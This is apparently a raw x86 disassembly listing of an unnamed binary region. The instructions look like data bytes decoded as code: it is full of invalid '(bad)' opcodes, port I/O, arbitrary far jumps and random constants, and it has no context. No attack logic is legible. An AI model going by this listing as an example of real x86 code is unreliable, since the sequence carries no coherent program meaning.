  41e256:	(bad)  
  41e257:	in     al,dx
  41e258:	jnp    0x41e272
  41e25a:	mov    al,ds:0xa738f757
  41e25f:	and    dl,BYTE PTR ds:0x9bf1f1fe
  41e265:	pop    esp
  41e266:	(bad)  
  41e267:	lods   al,BYTE PTR ds:[esi]
  41e268:	imul   ecx,DWORD PTR [ebx+eax*8+0x27],0xc580
	...
  41e278:	add    BYTE PTR [eax],al
  41e27a:	add    BYTE PTR [ebx],bh
  41e27c:	mov    cl,0x57
  41e27e:	lock fcomip st,st(6)
  41e281:	mov    edi,0xbb1c16fb
  41e286:	rol    BYTE PTR [edi],0xda
  41e289:	imul   edi,DWORD PTR cs:[edi+ebx*4+0xab0001],0x0
  41e292:	add    ah,bl
  41e294:	sub    edx,DWORD PTR [ecx]
  41e296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e297:	xchg   bh,al
  41e299:	pusha  
  41e29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e29b:	sbb    BYTE PTR [edi],bh
  41e29d:	cmp    DWORD PTR [ebx-0x2cc7ca20],0x40ddd450
  41e2a7:	out    dx,al
  41e2a8:	sub    DWORD PTR [ebx],edi
  41e2aa:	xchg   esi,eax
  41e2ab:	pop    eax
  41e2ac:	outs   dx,BYTE PTR ds:[esi]
  41e2ad:	mov    ecx,0xb08f4793
  41e2b2:	xor    bh,ch
  41e2b4:	adc    al,0x76
  41e2b6:	(bad)  
  41e2b7:	push   eax
  41e2b8:	sar    BYTE PTR [esi],1
  41e2ba:	neg    DWORD PTR [edi-0x4b8ce221]
  41e2c0:	jmp    0x4214ef38
  41e2c5:	add    bh,BYTE PTR [ecx]
  41e2c7:	cmp    ecx,ecx
  41e2c9:	jmp    0x73bb5f0f
  41e2ce:	cwde   
  41e2cf:	cwde   
  41e2d0:	cld    
  41e2d1:	call   FWORD PTR [esi]
  41e2d3:	adc    BYTE PTR [esi],0x62
  41e2d6:	cmp    DWORD PTR gs:[esi],esi
  41e2d9:	stos   DWORD PTR es:[edi],eax
  41e2da:	out    dx,al
  41e2db:	out    0xd2,eax
  41e2dd:	add    ebp,DWORD PTR [edx]
  41e2df:	ror    DWORD PTR [edx+ebx*4-0x19],1
  41e2e3:	jmp    0x1c20:0xdab143fa
  41e2ea:	jp     0x41e2aa
  41e2ec:	or     dh,ch
  41e2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ef:	test   eax,0xfaec0eae
  41e2f4:	jmp    0x41e35f
  41e2f6:	mov    bl,0xa2
  41e2f8:	rol    BYTE PTR [esi-0x52d45ba],cl
  41e2fe:	in     eax,0xcd
  41e300:	fist   WORD PTR [edx-0x52]
  41e303:	push   0xffffffb3
  41e305:	or     cl,ah
  41e307:	pop    ecx
  41e308:	in     eax,dx
  41e309:	and    BYTE PTR [edi],al
  41e30b:	ss arpl si,dx
  41e30e:	sub    BYTE PTR [esi],dh
  41e310:	jmp    edx
  41e312:	ficom  WORD PTR [ebx-0x42bf5f77]
  41e318:	addr16 jmp 0x25cd6535
  41e31e:	or     BYTE PTR [ecx],ah
  41e320:	fwait
  41e321:	dec    ebx
  41e322:	jno    0x41e37a
  41e324:	push   cs
  41e325:	cmp    DWORD PTR [edi],0x378830c
  41e32b:	aad    0xb2
  41e32d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e32e:	pop    ebx
  41e32f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41e331:	jmp    0x9821:0x1a9aece6
  41e338:	aam    0x63
  41e33a:	sub    eax,0xb71009
	...
  41e34b:	aam    0xf
  41e34d:	push   ecx
  41e34e:	lock (bad) 
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	ret    0xc1c6
  41e35a:	pop    ebx
  41e35b:	addr16 mov al,ds:0x1
  41e35f:	stos   DWORD PTR es:[edi],eax
  41e360:	add    BYTE PTR [eax],al
  41e362:	add    BYTE PTR [edi],dh
  41e364:	mov    edx,0x59ae8573
  41e369:	cli    
  41e36a:	mov    ebp,0xfb01e850
  41e36f:	dec    esi
  41e370:	mov    ch,0xa7
  41e372:	mov    al,0x32
  41e374:	jne    0x41e3b5
  41e376:	push   cs
  41e377:	fs adc al,0xeb
  41e37a:	pop    ebx
  41e37b:	xor    DWORD PTR [ebx+0x1b66770e],esp
  41e381:	jge    0x41e32c
  41e383:	sahf   
  41e384:	sbb    BYTE PTR [ebx+ebx*4+0x39],bh
  41e388:	lahf   
  41e389:	out    0xa8,eax
  41e38b:	cmp    dh,bh
  41e38d:	dec    eax
  41e38e:	mov    cl,0x43
  41e390:	jp     0x41e3a0
  41e392:	outs   dx,DWORD PTR ds:[esi]
  41e393:	mov    esp,DWORD PTR [ebx-0x5c1b33f2]
  41e399:	mov    ebx,0x28a727d5
  41e39e:	iret   
  41e39f:	loope  0x41e416
  41e3a1:	and    eax,0xce7bc3d6
  41e3a6:	adc    bh,0x3f
  41e3a9:	popf   
  41e3aa:	xor    eax,ebp
  41e3ac:	pop    ebp
  41e3ad:	pop    edi
  41e3ae:	(bad)  
  41e3af:	repnz pop ecx
  41e3b1:	inc    esi
  41e3b2:	ficom  DWORD PTR [edx+0x278a0c82]
  41e3b8:	sub    BYTE PTR [eax-0x20],ch
  41e3bb:	xor    al,0xd8
  41e3bd:	mov    esi,0x1964810c
  41e3c2:	jb     0x41e412
  41e3c4:	lock xlat BYTE PTR ds:[ebx]
  41e3c6:	div    DWORD PTR [ebx]
  41e3c8:	dec    esi
  41e3c9:	xor    al,0x1f
  41e3cb:	jl     0x41e3b5
  41e3cd:	jecxz  0x41e434
  41e3cf:	pushf  
  41e3d0:	jnp    0x41e44d
  41e3d2:	mov    WORD PTR [eax+edi*4-0x1b],?
  41e3d6:	push   edx
  41e3d7:	and    al,0xf
  41e3d9:	mov    BYTE PTR [ebx-0x35],dl
  41e3dc:	pop    ss
  41e3dd:	pop    es
  41e3de:	call   FWORD PTR [edi-0x8]
  41e3e1:	lahf   
  41e3e2:	push   ecx
  41e3e3:	sbb    BYTE PTR [edx],dl
  41e3e5:	xor    DWORD PTR ds:[eax-0x34],eax
  41e3e9:	int3   
  41e3ea:	pusha  
  41e3eb:	mov    DWORD PTR [esi-0x59],ecx
  41e3ee:	stos   DWORD PTR es:[edi],eax
  41e3ef:	mov    ebp,0xb0547a5f
  41e3f4:	xor    DWORD PTR [edx],esi
  41e3f6:	fucom  st(5)
  41e3f8:	leave  
  41e3f9:	mov    eax,0x754c2554
  41e3fe:	imul   esi,DWORD PTR [edi],0xffffffd9
  41e401:	mov    bh,0x63
  41e403:	xor    ecx,DWORD PTR [ebp+0x6a1796d6]
  41e409:	mov    eax,0x2b6a763f
	...
  41e41a:	add    ch,cl
  41e41c:	sub    eax,0xfbf54395
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	jp     0x41e484
  41e429:	mov    edx,0x1a1126a
  41e42e:	add    BYTE PTR [ebx+0x0],ch
  41e434:	nop
  41e435:	int3   
  41e436:	xor    eax,0x32a98fbe
  41e43b:	out    dx,eax
  41e43c:	jmp    0x41e449
  41e43e:	je     0x41e460
  41e440:	je     0x41e4a4
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	ja     0x41e41c
  41e445:	je     0x41e408
  41e447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e448:	mov    esi,0xbafc77cb
  41e44d:	out    0xf9,al
  41e44f:	mov    ds:0xfe559098,al
  41e454:	pop    es
  41e455:	inc    ebx
  41e456:	add    ebx,DWORD PTR [esi]
  41e458:	aam    0xf6
  41e45a:	jbe    0x41e422
  41e45c:	icebp  
  41e45d:	das    
  41e45e:	jmp    0x85:0x8d6669c1
  41e465:	iret   
  41e466:	in     eax,dx
  41e467:	mov    ?,WORD PTR [esi+esi*4+0x1aa54b18]
  41e46e:	or     al,BYTE PTR [eax+0x7d]
  41e471:	pop    ss
  41e472:	aad    0x42
  41e474:	sub    esp,edi
  41e476:	adc    al,0xdb
  41e478:	add    BYTE PTR [edi+eiz*1-0x6c2e31c],bl
  41e47f:	xchg   ebx,eax
  41e480:	ds pop es
  41e482:	push   eax
  41e483:	pop    ecx
  41e484:	aad    0xf7
  41e486:	cmp    al,0x8b
  41e488:	sub    eax,0x61c0b2b9
  41e48d:	jmp    DWORD PTR [edi+0x18]
  41e490:	les    eax,FWORD PTR [edi]
  41e492:	pop    eax
  41e493:	mov    ah,0x47
  41e495:	pop    es
  41e496:	lahf   
  41e497:	jb     0x41e44c
  41e499:	mov    ds:0x1d7ac33a,al
  41e49e:	adc    eax,edi
  41e4a0:	and    eax,edx
  41e4a2:	ja     0x41e49b
  41e4a4:	mov    esp,0xde99c536
  41e4a9:	mov    bh,0x58
  41e4ab:	xor    eax,0x6ccc1688
  41e4b0:	push   edi
  41e4b1:	mov    esi,0x7688ff17
  41e4b6:	push   ebp
  41e4b7:	cld    
  41e4b8:	pop    edi
  41e4b9:	mov    al,ds:0xd7fb41cb
  41e4be:	in     eax,dx
  41e4bf:	shl    BYTE PTR [edx],0x7b
  41e4c2:	shrd   DWORD PTR [esi+0x19],esp,0x15
  41e4c7:	lahf   
  41e4c8:	dec    eax
  41e4c9:	mov    esp,0x735a0334
  41e4ce:	out    dx,al
  41e4cf:	hlt    
  41e4d0:	js     0x41e487
  41e4d2:	push   es
  41e4d3:	fcom   DWORD PTR [eax]
  41e4d5:	inc    eax
  41e4d6:	data16 (bad) 
  41e4d8:	retf   
  41e4d9:	imul   edx,DWORD PTR [esi+0xf5ef13],0x0
	...
  41e4e8:	add    BYTE PTR [eax],al
  41e4ea:	add    BYTE PTR [ebx],dl
  41e4ec:	fs out 0xb,eax
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0xf74b4cfc
  41e4f9:	mov    esp,0x1a1bdfc
  41e4fe:	add    BYTE PTR [ebx-0x1a000000],ch
  41e504:	jmp    0x328b3c81
  41e509:	mov    ds:0xfa6b3297,al
  41e50e:	aam    0xf9
  41e510:	dec    edi
  41e511:	sub    eax,0x5c6b5fe2
  41e516:	loop   0x41e51a
  41e518:	sub    al,0x57
  41e51a:	and    WORD PTR [esi+eax*4],0x154a
  41e520:	push   es
  41e521:	xor    BYTE PTR [ecx+0x18114070],ch
  41e527:	mov    edx,ebx
  41e529:	arpl   WORD PTR [edi-0x63],ax
  41e52c:	aam    0xdb
  41e52e:	fcom   DWORD PTR [esi+0x40870f9d]
  41e534:	xor    BYTE PTR [esi],0x7b
  41e537:	(bad)  
  41e538:	xchg   edi,eax
  41e539:	add    cl,BYTE PTR [eax-0x31]
  41e53c:	sub    BYTE PTR [esi-0x63713867],bh
  41e542:	jnp    0x41e4ec
  41e544:	inc    ebx
  41e545:	pop    ds
  41e546:	int    0x4b
  41e548:	scas   eax,DWORD PTR es:[edi]
  41e549:	retf   
  41e54a:	and    ah,BYTE PTR [edi-0x21903c13]
  41e550:	pop    es
  41e551:	rcl    edi,0x7d
  41e554:	sar    DWORD PTR [ebp-0x3f6164b6],cl
  41e55a:	xchg   ebp,eax
  41e55b:	pop    edx
  41e55c:	mov    ebp,0x38a31eae
  41e561:	dec    ebp
  41e562:	sbb    DWORD PTR [esi+0x715438b3],0x538e65aa
  41e56c:	or     eax,0x1ab8fb3a
  41e571:	jl     0x41e519
  41e573:	jle    0x41e5e1
  41e575:	fs fsub st(7),st
  41e578:	loop   0x41e555
  41e57a:	xchg   DWORD PTR [ecx-0x65],eax
  41e57d:	std    
  41e57e:	pop    esp
  41e57f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e580:	ss inc edi
  41e582:	pop    esi
  41e583:	vmaxpd xmm5,xmm5,XMMWORD PTR [ebp-0x23352fd6]
  41e58b:	pop    ebx
  41e58c:	aam    0x2e
  41e58e:	lock lock fstp QWORD PTR [edx+0x22753c53]
  41e596:	call   0xaec:0xac6291ea
  41e59d:	cld    
  41e59e:	fcomp  QWORD PTR [ebp-0x48]
  41e5a1:	pop    ecx
  41e5a2:	fisub  DWORD PTR [edi+esi*2-0x35]
  41e5a6:	and    eax,0x5a4aa236
  41e5ab:	icebp  
  41e5ac:	fwait
  41e5ad:	jmp    0x0:0x0
  41e5b4:	add    BYTE PTR [eax],al
  41e5b6:	add    BYTE PTR [eax],al
  41e5b8:	add    BYTE PTR [eax],al
  41e5ba:	add    BYTE PTR [edi],ah
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	inc    edx
  41e5c8:	in     eax,0xbe
  41e5ca:	clc    
  41e5cb:	push   0xab0001a2
  41e5d0:	add    BYTE PTR [eax],al
  41e5d2:	add    BYTE PTR [ebp-0x5d],dh
  41e5d5:	rcr    BYTE PTR ds:0x363fac6b,1
  41e5db:	sub    cl,dl
  41e5dd:	jmp    0x7b7d:0x23bb0638
  41e5e4:	shr    dl,cl
  41e5e6:	shl    BYTE PTR [esi+0x2f],1
  41e5e9:	dec    esp
  41e5ea:	sbb    eax,0xca1b29f8
  41e5ef:	pushf  
  41e5f0:	pop    es
  41e5f1:	xchg   ebx,eax
  41e5f2:	retf   
  41e5f3:	inc    ebx
  41e5f4:	fld    TBYTE PTR [edx-0x12]
  41e5f7:	jb     0x41e5cd
  41e5f9:	jl     0x41e604
  41e5fb:	stos   BYTE PTR es:[edi],al
  41e5fc:	xchg   ecx,eax
  41e5fd:	push   edx
  41e5fe:	call   0x26c:0xdbb55b89
  41e605:	mov    al,ds:0xd8878df3
  41e60a:	jp     0x41e5a9
  41e60c:	xlat   BYTE PTR ds:[ebx]
  41e60d:	test   al,0x3c
  41e610:	ficomp DWORD PTR ds:0xb4c9b230
  41e616:	pop    es
  41e617:	outs   dx,DWORD PTR ds:[esi]
  41e618:	mov    bh,0xe6
  41e61a:	add    eax,ebp
  41e61c:	and    DWORD PTR [ebx-0x313d2ebb],0xfffffff9
  41e623:	sbb    DWORD PTR [edi+0x1],ecx
  41e626:	jne    0x41e5e6
  41e628:	out    dx,al
  41e629:	imul   edx,edi,0xc16e9ce1
  41e62f:	(bad)  
  41e630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e631:	ss (bad) 
  41e633:	cmp    BYTE PTR [esi-0x49],dl
  41e636:	mov    ds:0x9c96613c,al
  41e63b:	pop    eax
  41e63c:	pop    ebp
  41e63d:	imul   BYTE PTR [edi+0x1b]
  41e640:	outs   dx,DWORD PTR ds:[esi]
  41e641:	mov    eax,0xda693664
  41e646:	jne    0x41e6b4
  41e648:	ja     0x41e698
  41e64a:	fmul   DWORD PTR [esi+edx*2]
  41e64d:	push   ss
  41e64e:	shr    BYTE PTR [ecx+eax*8-0x3af26ead],1
  41e655:	cmp    BYTE PTR [esp+eiz*2],bl
  41e658:	aas    
  41e659:	scas   eax,DWORD PTR es:[edi]
  41e65a:	in     eax,dx
  41e65b:	sti    
  41e65c:	dec    edx
  41e65d:	data16 loopne 0x41e5fe
  41e660:	sbb    edi,DWORD PTR [ebx]
  41e662:	(bad)  
  41e663:	(bad)  
  41e665:	dec    edx
  41e666:	pushf  
  41e667:	mov    cl,0x4f
  41e669:	fwait
  41e66a:	xor    edx,DWORD PTR [esi]
  41e66c:	pop    ss
  41e66d:	faddp  st(6),st
  41e66f:	jno    0x41e6d3
  41e671:	sub    ecx,DWORD PTR [ebx+0x52]
  41e674:	and    BYTE PTR [eax-0x46debf37],dh
  41e67a:	out    0xec,al
  41e67c:	ins    DWORD PTR es:[edi],dx
  41e67d:	pop    edx
	...
  41e68a:	add    BYTE PTR [esi],dh
  41e68c:	add    dl,BYTE PTR [ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0xe4a79806
  41e69b:	pop    esp
  41e69c:	mov    al,BYTE PTR [ecx]
  41e69e:	add    BYTE PTR [ebx-0x10000000],ch
  41e6a4:	sbb    eax,0x6e717af2
  41e6a9:	addr16 dec ebp
  41e6ab:	mov    dh,0x34
  41e6ad:	popa   
  41e6ae:	sbb    eax,0x11355c7c
  41e6b3:	mov    al,ds:0x8ebc7b75
  41e6b8:	push   ss
  41e6b9:	stos   BYTE PTR es:[edi],al
  41e6ba:	pusha  
  41e6bb:	jns    0x41e6af
  41e6bd:	ins    DWORD PTR es:[edi],dx
  41e6be:	out    dx,al
  41e6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6c0:	lahf   
  41e6c1:	or     cl,BYTE PTR [edx+0x2c36d32e]
  41e6c7:	nop
  41e6c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6c9:	mov    bh,0x20
  41e6cb:	repz and DWORD PTR [eax],0xa5484707
  41e6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6d3:	sub    eax,0xb4439027
  41e6d8:	int    0x64
  41e6da:	mov    ch,0xc8
  41e6dc:	jae    0x41e669
  41e6de:	repz (bad) 
  41e6e1:	add    BYTE PTR [eax],al
  41e6e3:	test   al,0x10
  41e6e5:	sub    eax,DWORD PTR [esi+edi*1-0x4e]
  41e6e9:	(bad)  
  41e6ea:	(bad)  
  41e6ec:	ins    BYTE PTR es:[edi],dx
  41e6ed:	xchg   ebp,eax
  41e6ee:	push   edi
  41e6ef:	fs out dx,al
  41e6f1:	xlat   BYTE PTR ds:[ebx]
  41e6f2:	fst    QWORD PTR [esi-0x2cef0787]
  41e6f8:	dec    ebp
  41e6f9:	retf   
  41e6fa:	out    dx,eax
  41e6fb:	lock ficom WORD PTR [esi]
  41e6fe:	ss (bad) 
  41e700:	xchg   edx,eax
  41e701:	xlat   BYTE PTR ds:[ebx]
  41e702:	cmp    eax,0x4c7d1b6f
  41e707:	out    dx,eax
  41e708:	das    
  41e709:	sbb    BYTE PTR [edi+0x63e0d353],bh
  41e70f:	mov    ebp,0xce903884
  41e714:	xor    ecx,DWORD PTR [esi]
  41e716:	mov    cl,BYTE PTR [ecx]
  41e718:	mov    bh,BYTE PTR [edx-0x4a11a2d1]
  41e71e:	adc    DWORD PTR [edx-0x5cccbbd5],esp
  41e724:	std    
  41e725:	xor    eax,0xacba7524
  41e72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e72b:	jmp    0x4be0:0x4f7c9c02
  41e732:	sbb    ebx,DWORD PTR [esi]
  41e734:	lods   al,BYTE PTR ds:[esi]
  41e735:	leave  
  41e736:	xchg   edi,eax
  41e737:	enter  0x4797,0x94
  41e73b:	gs ret 0xe523
  41e73f:	ret    
  41e740:	xchg   BYTE PTR ds:0x6df58321,cl
  41e746:	jle    0x41e797
  41e748:	inc    ebx
  41e749:	pop    esi
  41e74a:	mov    cl,0xe9
  41e74c:	out    dx,eax
  41e74d:	add    DWORD PTR [eax],0x0
	...
  41e75b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8b07:0xf1655b75
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	stos   DWORD PTR es:[edi],eax
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    BYTE PTR [eax-0x49],bh
  41e775:	mov    dh,0x27
  41e777:	cwde   
  41e778:	mov    bh,0xc6
  41e77a:	mov    edi,0xe61f9d76
  41e77f:	and    al,BYTE PTR [edx+ebp*2-0x8]
  41e783:	test   BYTE PTR [edx+0x7],ch
  41e786:	mov    bl,0xd5
  41e788:	stc    
  41e789:	pushf  
  41e78a:	out    0xaf,eax
  41e78c:	add    al,0xa4
  41e78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e78f:	fmul   QWORD PTR [ebx]
  41e791:	aad    0x5b
  41e793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e794:	in     al,dx
  41e795:	fild   DWORD PTR fs:[edi+0x13949e77]
  41e79c:	bound  ebp,QWORD PTR [edi+0x749b64b5]
  41e7a2:	das    
  41e7a3:	les    ecx,FWORD PTR [ebp+ebx*8-0x3dcef95c]
  41e7aa:	ins    DWORD PTR es:[edi],dx
  41e7ab:	push   esi
  41e7ac:	ss xchg ebx,eax
  41e7ae:	xor    eax,0x792ef377
  41e7b3:	outs   dx,BYTE PTR ds:[esi]
  41e7b4:	scas   eax,DWORD PTR es:[edi]
  41e7b5:	(bad)  
  41e7b6:	in     eax,0x5d
  41e7b8:	jns    0x41e78c
  41e7ba:	gs pop ebx
  41e7bc:	jp     0x41e788
  41e7be:	(bad)  
  41e7c0:	jmp    0x41e743
  41e7c2:	(bad)  
  41e7c3:	(bad)  
  41e7c4:	retf   0x1815
  41e7c7:	push   edx
  41e7c8:	ja     0x41e77b
  41e7ca:	xlat   BYTE PTR ds:[ebx]
  41e7cb:	fisttp QWORD PTR [eax-0xf]
  41e7ce:	pop    edx
  41e7cf:	sub    ch,bl
  41e7d1:	inc    esi
  41e7d2:	xchg   ebp,eax
  41e7d3:	rol    DWORD PTR [esi],1
  41e7d5:	jmp    0xca24:0xe9eec40f
  41e7dc:	ror    ebx,cl
  41e7de:	sti    
  41e7df:	ja     0x41e80f
  41e7e1:	adc    ebx,DWORD PTR [ebp-0x71bb9f7d]
  41e7e7:	mov    bh,0xd4
  41e7e9:	lods   al,BYTE PTR ds:[esi]
  41e7ea:	inc    ebp
  41e7eb:	push   esp
  41e7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ed:	fdivrp st(7),st
  41e7ef:	aaa    
  41e7f0:	mov    fs,edx
  41e7f2:	mov    ecx,0x4faf4c38
  41e7f7:	dec    edi
  41e7f8:	in     al,dx
  41e7f9:	push   ebx
  41e7fa:	cmp    BYTE PTR [eax+0x545dad5b],ch
  41e800:	cmp    DWORD PTR [ebp-0x56bf135b],ebp
  41e806:	xchg   edi,eax
  41e807:	jns    0x41e803
  41e809:	sbb    BYTE PTR [ecx+eiz*2+0x43b8bb87],0x8f
  41e811:	test   al,0x36
  41e813:	cmc    
  41e814:	pop    ss
  41e815:	in     eax,dx
  41e816:	push   edx
  41e817:	jmp    0x5152:0x70816a04
	...
  41e82a:	add    bh,bl
  41e82c:	push   ebx
  41e82d:	mov    dl,0x4f
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0xc1
  41e838:	in     al,0x74
  41e83a:	adc    al,0xb2
  41e83c:	mov    eax,DWORD PTR [ecx]
  41e83e:	add    BYTE PTR [ebx+0x4e000000],ch
  41e844:	or     bl,ch
  41e846:	sub    DWORD PTR [edi+0x200d6533],0x7d108d8b
  41e850:	xor    ah,dl
  41e852:	das    
  41e853:	adc    al,0x98
  41e855:	sub    DWORD PTR [eax-0x29f36d39],edi
  41e85b:	fadd   QWORD PTR [edi-0x986896f]
  41e861:	les    ecx,FWORD PTR [ebp*4+0x39ea1105]
  41e868:	call   0xc02c44ae
  41e86d:	cvtps2pd xmm5,QWORD PTR [esp+edi*8+0x1]
  41e872:	jl     0x41e85f
  41e874:	scas   eax,DWORD PTR es:[di]
  41e876:	push   ds
  41e877:	pop    ecx
  41e878:	sub    BYTE PTR [edi-0x24099a78],0x1a
  41e87f:	icebp  
  41e880:	in     eax,dx
  41e881:	leave  
  41e882:	shl    BYTE PTR [edi-0x1d77be57],0xed
  41e889:	sbb    DWORD PTR [ecx-0x3c],edi
  41e88c:	(bad)  
  41e88e:	in     al,dx
  41e88f:	sahf   
  41e890:	aam    0x1e
  41e892:	dec    esp
  41e893:	shl    BYTE PTR [esi+ebp*1+0x20],cl
  41e897:	jnp    0x41e90f
  41e899:	ret    0xaff6
  41e89c:	or     ecx,DWORD PTR [esi]
  41e89e:	push   0xfffffffe
  41e8a0:	mov    ds:0x2173e219,al
  41e8a5:	ds inc eax
  41e8a7:	adc    bh,dh
  41e8a9:	sahf   
  41e8aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8ab:	ss sbb eax,0x2c8d8dd6
  41e8b1:	imul   edi,ebp,0xfffffffc
  41e8b4:	xchg   esp,eax
  41e8b5:	(bad)  
  41e8b6:	clc    
  41e8b7:	fnstcw WORD PTR [ecx]
  41e8b9:	sub    al,ah
  41e8bb:	pusha  
  41e8bc:	mov    al,0xcd
  41e8be:	push   edi
  41e8bf:	(bad)  
  41e8c0:	aaa    
  41e8c1:	lods   al,BYTE PTR ds:[esi]
  41e8c2:	mov    ecx,0xe11763c
  41e8c7:	jge    0x41e8b5
  41e8c9:	push   ss
  41e8ca:	xor    DWORD PTR ds:0xe6b1ec1e,edx
  41e8d0:	mov    esp,0x5eb9de8a
  41e8d5:	vmulpd ymm7,ymm0,ymm0
  41e8d9:	sub    DWORD PTR [edi+0x13bd2bf2],ebp
  41e8df:	add    al,0x37
  41e8e1:	stos   BYTE PTR es:[edi],al
  41e8e2:	add    edi,DWORD PTR [ebx-0x75]
  41e8e5:	dec    edx
  41e8e6:	xchg   esi,eax
  41e8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8e8:	arpl   sp,bp
  41e8ea:	add    esp,esp
  41e8ec:	push   cs
  41e8ed:	into   
	...
  41e8fa:	add    BYTE PTR [edi-0x24252cf4],al
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	add    esp,edi
  41e909:	jmp    0xab00:0x18c5ddf
  41e910:	add    BYTE PTR [eax],al
  41e912:	add    cl,cl
  41e914:	and    bh,BYTE PTR [edi-0x5b342668]
  41e91a:	cmp    BYTE PTR [ebp+0x7d3bfd96],cl
  41e920:	push   esp
  41e921:	lea    esi,[ebp+0x2a]
  41e924:	sbb    bl,BYTE PTR [ecx+0x4e]
  41e927:	retf   
  41e928:	mov    bl,0xfc
  41e92a:	leave  
  41e92b:	pop    ecx
  41e92c:	push   esi
  41e92d:	mov    dh,0x8a
  41e92f:	mov    al,ds:0xc0db2c3d
  41e934:	icebp  
  41e935:	loope  0x41e934
  41e937:	push   edx
  41e938:	scas   al,BYTE PTR es:[edi]
  41e939:	add    al,0xd9
  41e93b:	ror    DWORD PTR ss:[ebp-0x26],cl
  41e93f:	pop    ebp
  41e940:	mov    DWORD PTR [edx+edx*4+0x30],esi
  41e944:	retf   
  41e945:	xchg   esi,eax
  41e946:	pop    edi
  41e947:	pop    eax
  41e948:	cmp    ecx,eax
  41e94a:	sub    al,0x71
  41e94c:	xchg   ecx,eax
  41e94d:	repnz data16 ins BYTE PTR es:[edi],dx
  41e950:	jge    0x41e984
  41e952:	sub    al,0x43
  41e954:	nop
  41e955:	or     ah,BYTE PTR [esi-0x56]
  41e958:	loopne 0x41e959
  41e95a:	jecxz  0x41e8fc
  41e95c:	mov    ecx,0x3b3fb265
  41e961:	rol    ebp,1
  41e963:	cmp    al,0x44
  41e965:	mov    ah,0xf5
  41e967:	xor    ch,BYTE PTR [edi-0x5d4a0ff9]
  41e96d:	jle    0x41e943
  41e96f:	sub    al,BYTE PTR [edi-0x4ec38920]
  41e975:	push   0xffffff89
  41e977:	jb     0x41e976
  41e979:	sahf   
  41e97a:	or     BYTE PTR [ebx],al
  41e97c:	fimul  DWORD PTR [ecx+0x82411b3]
  41e982:	fsub   DWORD PTR [edi+0x2839935d]
  41e988:	test   al,0x46
  41e98a:	pop    edi
  41e98b:	sar    BYTE PTR [ebp+0x1bff8fd6],cl
  41e991:	aam    0x3
  41e993:	ret    
  41e994:	addr16 jno 0x41e9a8
  41e997:	add    ch,0x2e
  41e99a:	fdivr  QWORD PTR [ebx-0x52db3b11]
  41e9a0:	or     eax,DWORD PTR [ebp+0x16]
  41e9a3:	cmp    ch,BYTE PTR [edi+0x5c]
  41e9a6:	mov    ds:0x7df7c4a0,eax
  41e9ab:	repnz and eax,0xbfc772ba
  41e9b1:	(bad)  
  41e9b2:	xor    esp,esp
  41e9b4:	das    
  41e9b5:	adc    bl,dh
  41e9b7:	imul   ebx,DWORD PTR [edi-0x25],0x25
  41e9bb:	dec    eax
  41e9bc:	inc    esi
  41e9bd:	xchg   edx,eax
	...
  41e9ca:	add    BYTE PTR [edi-0x28db29d],bl
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [ecx+ebx*4+0x850fa03],dh
  41e9dc:	lea    eax,[ecx]
  41e9de:	add    BYTE PTR [ebx+0x42000000],ch
  41e9e4:	mov    eax,ds:0xdd119aef
  41e9e9:	sbb    dh,BYTE PTR [edx]
  41e9eb:	les    edx,FWORD PTR [eax]
  41e9ed:	sbb    DWORD PTR [ecx+ebx*2-0x59a6a9e5],esp
  41e9f4:	cli    
  41e9f5:	push   edi
  41e9f6:	test   BYTE PTR [edi-0x30ca3b32],dl
  41e9fc:	xor    al,0x52
  41e9fe:	outs   dx,DWORD PTR ds:[esi]
  41e9ff:	mov    ebp,esp
  41ea01:	and    al,0x67
  41ea03:	dec    ecx
  41ea04:	or     eax,0x1f9908ad
  41ea09:	add    BYTE PTR [ecx+0x486b389],bl
  41ea0f:	mov    ds:0xf8cf08df,al
  41ea14:	fsub   DWORD PTR [edx+0x2c36c868]
  41ea1a:	cli    
  41ea1b:	xchg   edi,eax
  41ea1c:	pop    ebp
  41ea1d:	sbb    BYTE PTR [ebx-0x32],0xe4
  41ea21:	aam    0x52
  41ea23:	test   eax,0x7cabbbd3
  41ea28:	and    BYTE PTR [edi-0x73],cl
  41ea2b:	hlt    
  41ea2c:	fisub  WORD PTR [ebp+0x5f]
  41ea2f:	jns    0x41ea99
  41ea31:	loopne 0x41ea10
  41ea33:	into   
  41ea34:	lods   eax,DWORD PTR ds:[esi]
